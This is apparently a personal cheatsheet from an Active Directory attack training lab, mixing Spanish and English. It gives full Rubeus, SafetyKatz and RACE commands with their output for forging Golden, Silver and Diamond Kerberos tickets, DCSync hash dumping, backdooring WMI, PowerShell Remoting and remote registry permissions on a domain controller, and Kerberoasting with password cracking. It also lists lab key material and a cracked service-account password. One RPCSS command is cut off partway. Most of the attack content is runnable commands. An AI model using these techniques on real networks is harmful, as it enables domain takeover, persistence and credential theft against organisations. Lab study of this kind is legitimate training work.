# 🏁 Cheatsheet - Fast Commands (POST-EXPLOTATION)

| **Hash / Clave usada**      | Hash de **krbtgt** (NTLM o AES)                          | Hash de la **cuenta de máquina** del servidor (ej. dcorp-dc$) | Hash de **krbtgt** (igual que Golden)                                   |
| --------------------------- | -------------------------------------------------------- | ------------------------------------------------------------- | ----------------------------------------------------------------------- |
| **Alcance**                 | Todo el dominio                                          | Solo un servidor específico                                   | Todo el dominio                                                         |
| **Qué impersonas**          | Cualquier usuario (normalmente Administrator)            | Cualquier usuario, pero solo en ese servidor                  | Cualquier usuario + **grupos arbitrarios** en el PAC                    |
| **Modifica el PAC**         | No                                                       | No                                                            | **Sí** (puedes añadir grupos como Domain Admins)                        |
| **Duración por defecto**    | 10 años                                                  | 10 años                                                       | 10 años                                                                 |
| **Nivel de OPSEC**          | Bajo (muy ruidoso)                                       | Alto (sigiloso)                                               | Bajo (tan ruidoso como Golden)                                          |
| **Detección**               | Fácil de detectar (krbtgt TGT requests)                  | Difícil de detectar                                           | Fácil de detectar (PAC modificado + krbtgt)                             |
| **Uso principal**           | Acceso total como DA                                     | Acceso sigiloso a un servicio concreto (WinRM, WMI, etc.)     | Bypassear restricciones de grupos / RBAC                                |
| **Comando típico (Rubeus)** | `Rubeus.exe golden /user:Administrator /krbtgt:... /ptt` | `Rubeus.exe silver /service:http/... /rc4:... /ptt`           | `Rubeus.exe diamond /user:Administrator /krbtgt:... /groupsid:... /ptt` |
| **Learning Objective**      | LO8                                                      | LO9                                                           | LO10                                                                    |
| **Requiere**                | Hash de krbtgt                                           | Hash de máquina del servidor                                  | Hash de krbtgt + capacidad de modificar PAC                             |
| **Ventaja**                 | Poder total                                              | Muy sigiloso                                                  | Poder total + bypass de membresía de grupos                             |

***

## Golden Ticket

> Info previusly obtained:
>
> * SID: S-1-5-21-719815819-3726368948-3917688648-502
> * AES256-kgbtb: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
> * user: Administrator

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
```

> In us vm student console/machine

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (8).png" alt="" width="509"><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Now, It generete us a complete command to forge a Golden ticket.

`C:\AD\Tools\Loader.exe Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3247 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD`

> Remember to add `-path C:\AD\Tools\Rubeus.exe -args` after `Loader.exe` and `/ptt` at the end of the generated command to inject it in the current process.&#x20;

> We need modificate a little bit the commands awarded by the previus commnad -->
>
> ```
> C:\AD\Tools\Loader.exe Evasive-Golden .....
> ```
>
> between -->
>
> <pre><code>C:\AD\Tools\Loader.exe <a data-footnote-ref href="#user-content-fn-1">-path C:\AD\Tools\Rubeus.exe -args </a>Evasive-Golden .....
> </code></pre>

Once the ticket is injected, we can access resources in the domain:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args Evasive-Golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:34:22 AM" /minpassage:1 /logoncount:3046 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

```
winrs -r:dcorp-dc cmd
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

***

## Silver Ticket

> Note that we are NOT using the krbtgt hash here. Using the below command, we can create a Silver Ticket that provides us access to the HTTP service (WinRM) on DC.
>
> Please note that the hash of `dcorp-dc$` (RC4 in the below command) may be different in your lab instance.&#x20;
>
> We can obtaine RC4 hash from dcorp-dc$ like-->
>
> ```
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp-dc$" "exit"
> ```

> Remember! DO ALL IT from Administrator Account since SVstudent machine
>
> ```
> C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /printcmd
> ```

### HTTP Service

You can also use aes256 keys in place of NTLM hash:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

<figure><img src="../../.gitbook/assets/image (561).png" alt=""><figcaption></figcaption></figure>

#### Verify it

We can check if we got the correct service ticket:

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

<figure><img src="../../.gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

We have the HTTP service ticket for `dcorp-dc`, let’s try accessing it using `winrs`. Note that we are using FQDN of `dcorp-dc` as that is what the service ticket has:

<figure><img src="../../.gitbook/assets/image (564).png" alt=""><figcaption></figcaption></figure>

### WMI Service

For accessing WMI, we need to create two tickets&#x20;

* &#x20;one for **HOST** service&#x20;
* another for **RPCSS**.&#x20;

Run the below commands from an elevated shell:

#### Host service

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:host/dcorp-dc.dollarcorp.moneycorp.local /rc4:c6a60b67476b36ad7838d7875c33c2c3 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

> * `/service:host/...` → le dice a Kerberos que este ticket es para el servicio HOST en el DC.
> * `/ptt` → inyecta el ticket directamente en tu sesión actual (no lo guarda en disco).
> * `/ldap` → Rubeus consulta el DC y completa SID, groups, etc. automáticamente.

Now, in the same windows we pushed him to Inject a ticket for **RPCSS**:

#### **RPCSS**

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:rpcss/dcorp-dc.
```

#### Verify it

Check if the tickets are present.

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
```

<figure><img src="../../.gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>

Now, try running WMI commands on the domain controller:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc
```

<figure><img src="../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

***

## Diamond Ticket

We can simply use the following Rubeus command to execute the attack.&#x20;

> Note that the command needs to be run from an elevated shell (Run as administrator).&#x20;
>
> We take the usual OPSEC care of using Loader:

> Info previusly obtained:
>
> * SID: S-1-5-21-719815819-3726368948-3917688648-502
> * AES256-kgbtb: 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
> * user: Administrator

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Access the DC using winrs from the new spawned process!

```
winrs -r:dcorp-dc cmd
set username
```

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Modificar Security Descriptors de WMI y PowerShell Remoting

> 1. Abre una **cmd como Administrator** (elevada) en tu student VM (dcorp-std453).
> 2. Desde esa cmd elevada, lanza un proceso **como Domain Admin** (svcadmin) usando el ticket que ya tienes del ejercicio anterior:
>
> ```
> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
> ```
>
> → Se abrirá una **nueva ventana de cmd** corriendo como **svcadmin** (Domain Admin).

### Option 1 – Enable remote WMI for studentX

Below command (to be run as Domain Administrator) modifies the host security descriptors for WMI on the DC to allow studentx access to WMI:

> Change studentX

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

#### Check It

Now, we can execute WMI queries on the DC as studentx:

```
PS C:\AD\Tools> gwmi -class win32_operatingsystem -ComputerName dcorp-dc

SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 20348
RegisteredUser  : Windows User
SerialNumber    : 00454-30000-00000-AA745
Version         : 10.0.20348
```

### Option 2 – Enable PowerShell Remoting for student453

Similar modification can be done to PowerShell remoting configuration. (In rare cases, you may get an I/O error while using the below command, please ignore it).&#x20;

> **Please note that this is unstable since some patches in August 2020**:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
```

Now, we can run commands using PowerShell remoting on the DC without DA privileges:

```
PS C:\AD\Tools> Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local

dcorp\studentx
```

#### Retrieve the machine account hash (dcorp-dc$) without being a local administrator

To retrieve machine account hash without DA, first we need to modify permissions on the DC. Run the below command as DA:

> Ejecuta esto también desde la sesión de svcadmin (misma ventana):

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\RACE.ps1
PS C:\AD\Tools> Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : ] Using trustee username 'studentx'
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Remote registry is not running, attempting to start
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local] Attaching to remote registry through StdRegProv
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Backdooring started for key
VERBOSE: [dcorp-dc.dollarcorp.moneycorp.local : SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg] Creating ACE with Access Mask of 983103
(ALL_ACCESS) and AceFlags of 2 (CONTAINER_INHERIT_ACE)

ComputerName                        BackdoorTrustee
------------                        ---------------
dcorp-dc.dollarcorp.moneycorp.local studentx

```

***

## Kerberoasting: Abusing Service Principal Names (SPNs) to Crack Service Account Passwords

First, we need to find services running with user accounts as the services running with machine accounts have difficult passwords.

We can use PowerView or ActiveDirectory module for discovering such services:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

The `svcadmin`, which is a domain administrator has a SPN set! Let’s Kerberoast it!

> **SPN = Service Principal Name**
>
> Es un nombre único que identifica **un servicio** que corre en el dominio.
>
> Ejemplos reales del lab:
>
> * MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433 → SQL Server
> * SNMP/ufc-adminsrv.dollarcorp.moneycorp.local → servicio SNMP
> * HTTP/dcorp-dc.dollarcorp.moneycorp.local → servicio web, etc.

### Rubeus and John the Ripper

> **Regla clave:**
>
> * Solo las **cuentas de usuario** (no las de máquina) que tienen un SPN registrado pueden ser Kerberoasteadas fácilmente.
> * Las cuentas de máquina (dcorp-dc$, etc.) tienen contraseñas muy largas y aleatorias → casi imposibles de crackear.

We can use Rubeus to get hashes for the svcadmin account. Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if ‘**This account supports Kerberos AES 128/256 bit encryption**’ is set for a service account, the below command will not request its hashes.

> Remember use a invishell

```
C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1
[*] Action: Kerberoasting
[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : svcadmin
[*] Target Domain          : dollarcorp.moneycorp.local
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\hashes.txt
```

We can now use John the Ripper to brute-force the hashes.

> Please note that you need to remove “**:1433**” from the SPN in hashes.txt before running John
>
> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*`&#x20;
>
> should be&#x20;
>
> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*`&#x20;
>
> in hashes.txt

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Run the below command after making above changes:

> It bruteforce the password of it user

```
C:\AD\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt

Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*ThisisBlasphemyThisisMadness!!  (?)
1g 0:00:00:00 DONE (2023-03-03 09:18) 90.90g/s 186181p/s 186181c/s 186181C/s energy..mollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

`svcadmin:*ThisisBlasphemyThisisMadness!!`

[^1]: 
